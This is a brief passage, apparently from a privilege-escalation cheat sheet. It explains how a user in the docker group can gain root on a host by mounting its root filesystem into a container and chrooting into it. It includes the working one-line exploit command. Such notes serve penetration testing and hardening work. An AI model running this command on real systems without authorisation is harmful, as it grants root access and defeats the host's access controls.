Basically, you run a docker container, mount the filesystem onto it, then chroot into the container. You will be root on said container with the entire filesystem mounted to it, so in essence you are root on the filesystem.

#### Exploit
```bash
# require you are able to run docker w/o sudo, i.e. you are part of the docker group. See enum for how to check.
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
